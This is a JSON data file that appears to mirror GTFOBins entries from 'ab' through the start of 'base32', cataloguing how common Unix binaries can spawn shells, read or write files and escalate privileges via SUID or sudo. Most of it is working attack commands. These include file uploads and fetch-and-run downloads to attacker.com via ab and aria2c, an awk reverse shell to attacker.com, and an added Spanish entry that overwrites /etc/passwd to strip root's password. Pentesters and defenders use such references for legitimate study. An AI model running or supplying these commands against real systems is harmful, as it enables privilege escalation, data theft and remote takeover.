[
    {
        "name": "ab",
        "url": "https://gtfobins.github.io/gtfobins/ab/",
        "functions": [
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Upload local file via HTTP POST request.",
                        "code": "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
                        "code": "URL=http://attacker.com/file_to_download\nab -v2 $URL"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "Upload local file via HTTP POST request.",
                        "code": "sudo install -m =xs $(which ab) .\n\nURL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "Upload local file via HTTP POST request.",
                        "code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL"
                    }
                ]
            }
        ]
    },
    {
        "name": "aoss",
        "url": "https://gtfobins.github.io/gtfobins/aoss/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "aoss /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo aoss /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "alpine",
        "url": "https://gtfobins.github.io/gtfobins/alpine/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nalpine -F \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which alpine) .\n\nLFILE=file_to_read\n./alpine -F \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo alpine -F \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ansible-test",
        "url": "https://gtfobins.github.io/gtfobins/ansible-test/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ansible-test shell"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ansible-test shell"
                    }
                ]
            }
        ]
    },
    {
        "name": "aa-exec",
        "url": "https://gtfobins.github.io/gtfobins/aa-exec/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "aa-exec /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which aa-exec) .\n\n./aa-exec /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo aa-exec /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "ansible-playbook",
        "url": "https://gtfobins.github.io/gtfobins/ansible-playbook/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nansible-playbook $TF"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF\nsudo ansible-playbook $TF"
                    }
                ]
            }
        ]
    },
    {
        "name": "apache2ctl",
        "url": "https://gtfobins.github.io/gtfobins/apache2ctl/",
            "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This includes the file in the actual configuration file, the first line is leaked as an error message."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\napache2ctl -c \"Include $LFILE\" -k stop"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo apache2ctl -c \"Include $LFILE\" -k stop"
                    }
                ]
            }
        ]
    },
    {
        "name": "apt-get",
        "url": "https://gtfobins.github.io/gtfobins/apt-get/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "apt-get changelog apt\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo apt-get changelog apt\n!/bin/sh"
                    },
                    {
                        "description": "For this to work the target package (e.g., sl) must not be installed.",
                        "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt-get install -c $TF sl"
                    },
                    {
                        "description": "When the shell exits the update command is actually executed.",
                        "code": "sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "7z",
        "url": "https://gtfobins.github.io/gtfobins/7z/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so"
                    }
                ]
            }
        ]
    },
    {
        "name": "agetty",
        "url": "https://gtfobins.github.io/gtfobins/agetty/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which agetty) .\n\n./agetty -o -p -l /bin/sh -a root tty"
                    }
                ]
            }
        ]
    },
    {
        "name": "apt",
        "url": "https://gtfobins.github.io/gtfobins/apt/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "apt changelog apt\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo apt changelog apt\n!/bin/sh"
                    },
                    {
                        "description": "For this to work the target package (e.g., sl) must not be installed.",
                        "code": "TF=$(mktemp)\necho 'Dpkg::Pre-Invoke {\"/bin/sh;false\"}' > $TF\nsudo apt install -c $TF sl"
                    },
                    {
                        "description": "When the shell exits the update command is actually executed.",
                        "code": "sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "aria2c",
        "url": "https://gtfobins.github.io/gtfobins/aria2c/",
        "functions": [
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\naria2c --on-download-error=$TF http://x"
                    },
                    {
                        "description": "The remote file aaaaaaaaaaaaaaaa (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. --allow-overwrite is needed if this is executed multiple times with the same GID.",
                        "code": "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request. Use --allow-overwrite if needed.",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\naria2c -o \"$LFILE\" \"$URL\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "COMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\nsudo aria2c --on-download-error=$TF http://x"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which aria2c) .\n\nCOMMAND='id'\nTF=$(mktemp)\necho \"$COMMAND\" > $TF\nchmod +x $TF\n./aria2c --on-download-error=$TF http://x"
                    }
                ]
            }
        ]
    },
    {
        "name": "ar",
        "url": "https://gtfobins.github.io/gtfobins/ar/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nar r \"$TF\" \"$LFILE\"\ncat \"$TF\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ar) .\n\nTF=$(mktemp -u)\nLFILE=file_to_read\n./ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -u)\nLFILE=file_to_read\nsudo ar r \"$TF\" \"$LFILE\"\ncat \"$TF\""
                    }
                ]
            }
        ]
    },
    {
        "name": "arp",
        "url": "https://gtfobins.github.io/gtfobins/arp/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The read file content is corrupted by error prints."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\narp -v -f \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which arp) .\n\nLFILE=file_to_read\n./arp -v -f \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ascii85",
        "url": "https://gtfobins.github.io/gtfobins/ascii85/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nascii85 \"$LFILE\" | ascii85 --decode"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ascii85 \"$LFILE\" | ascii85 --decode"
                    }
                ]
            }
        ]
    },
    {
        "name": "as",
        "url": "https://gtfobins.github.io/gtfobins/as/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The file content is treated as command line options and disclosed throught error messages, so this is not suitable to read arbitrary binary data."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nas @$LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which as) .\n\nLFILE=file_to_read\n./as @$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo as @$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "arj",
        "url": "https://gtfobins.github.io/gtfobins/arj/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The archive can also be prepared offline then uploaded.",
                        "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\narj e \"$TF/a\" $LDIR"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file appears amid some other textual information. The archive can also be downloaded then extracted offline.",
                        "code": "TF=$(mktemp -u)\nLFILE=file_to_read\narj a \"$TF\" \"$LFILE\"\narj p \"$TF\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The archive can also be prepared offline then uploaded.",
                        "code": "sudo install -m =xs $(which arj) .\n\nTF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\n./arj e \"$TF/a\" $LDIR"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The archive can also be prepared offline then uploaded.",
                        "code": "TF=$(mktemp -d)\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >\"$TF/$LFILE\"\narj a \"$TF/a\" \"$TF/$LFILE\"\nsudo arj e \"$TF/a\" $LDIR"
                    }
                ]
            }
        ]
    },
    {
        "name": "aspell",
        "url": "https://gtfobins.github.io/gtfobins/aspell/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "The textual file is displayed in an interactive TUI showing only the parts that contain mispelled words."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\naspell -c \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which aspell) .\n\nLFILE=file_to_read\n./aspell -c \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo aspell -c \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ascii-xfr",
        "url": "https://gtfobins.github.io/gtfobins/ascii-xfr/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nascii-xfr -ns \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ascii-xfr) .\n\nLFILE=file_to_read\n./ascii-xfr -ns \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo ascii-xfr -ns \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "ash",
        "url": "https://gtfobins.github.io/gtfobins/ash/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "ash"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which ash) .\n\n./ash"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo ash"
                    }
                ]
            }
        ]
    },
    {
        "name": "at",
        "url": "https://gtfobins.github.io/gtfobins/at/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null"
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "The invocation will be blind, but it is possible to redirect the output to a file in a readable location.",
                        "code": "COMMAND=id\necho \"$COMMAND\" | at now"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "awk",
        "url": "https://gtfobins.github.io/gtfobins/awk/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "awk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell.",
                        "code": "LPORT=12345\nawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nawk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which awk) .\n\nLFILE=file_to_read\n./awk '//' \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo awk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            },
            {
                "function": "Sudo Alternativo",
                "description": "Por si el sudo oficial de GTFOBins no es efectivo, usa esta alternativa - By SkyW4r33x.",
                "examples": [
                    {
                        "description": "En la máquina víctima ubícate en el directorio /tmp/.",
                        "code": "cd /tmp/"
                    },
                    {
                        "description": "Copia el /etc/passwd en el directorio",
                        "code": "cp /etc/passwd ."
                    },
                    {
                        "description": "Modifica el passwd que copiaste y quita la 'x' del usuario root para que no pida contraseña al momento de autenticarte como root",
                        "code": "root::0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin"
                    },
                    {
                        "description": "Sobrescribe el archivo passwd original con la versión modificada usando la ruta absoluta del binario awk",
                        "code": "/usr/bin/awk 'BEGIN { \n    while ((getline < \"/tmp/passwd\") > 0) print > \"/etc/passwd\"; \n    while ((getline < \"/etc/passwd\") > 0) print > \"/etc/passwd\"; \n}'"
                    },
                    {
                        "description": "Finalmente, intenta autenticarte como root. Si todo salió bien, deberías obtener acceso sin que te pida contraseña:",
                        "code": "$ su root\nwhoami\n# root"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which awk) .\n\n./awk 'BEGIN {system(\"/bin/sh\")}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "aws",
        "url": "https://gtfobins.github.io/gtfobins/aws/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "aws help\n!/bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This invokes the default pager, which is likely to be less, other functions may apply.",
                        "code": "sudo aws help\n!/bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "atobm",
        "url": "https://gtfobins.github.io/gtfobins/atobm/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Outputs the first line of the file to standard error without the - and # characters, this can be customized with the -c option, by default is -c -#."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\natobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which atobm) .\n\nLFILE=file_to_read\n./atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo atobm $LFILE 2>&1 | awk -F \"'\" '{printf \"%s\", $2}'"
                    }
                ]
            }
        ]
    },
    {
        "name": "base32",
        "url": "https://gtfobins.github.io/gtfobins/base32/",
        "functions": [
            {
